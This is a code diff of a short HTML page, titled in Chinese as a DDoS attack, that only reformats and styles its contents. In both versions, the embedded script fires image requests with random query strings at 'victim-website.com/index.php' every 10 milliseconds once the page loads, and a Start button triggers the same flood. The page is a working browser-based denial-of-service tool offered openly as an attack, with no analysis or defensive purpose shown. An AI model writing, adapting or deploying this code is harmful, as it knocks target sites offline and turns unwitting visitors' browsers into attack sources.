@@ -1,19 +1,31 @@
+<!DOCTYPE html>
 <html>
+
 <head>
-<script>
-function imgflood() {  
-  var TARGET = 'victim-website.com'
-  var URI = '/index.php?'
-  var pic = new Image()
-  var rand = Math.floor(Math.random() * 1000)
-  pic.src = 'http://'+TARGET+URI+rand+'=val'
-}
-setInterval(imgflood, 10)
-</script>
+  <meta charset="UTF-8">
+  <title>DDOS攻击</title>
+  <script>
+    function imgflood() {
+      var TARGET = 'victim-website.com'
+      var URI = '/index.php?'
+      var pic = new Image()
+      var rand = Math.floor(Math.random() * 1000)
+      pic.src = 'http://' + TARGET + URI + rand + '=val'
+    }
+    setInterval(imgflood, 10)
+  </script>
+  <style>
+    .Start_Bu{
+      font-size: xx-large;
+      margin: 0 auto;
+    }
+  </style>
 </head>
+
 <body>
-<button onclick='imgflood();'>
-Start
-</button>
+  <button class="Start_Bu" onclick='imgflood();'>
+    Start
+  </button>
 </body>
+
 </html>
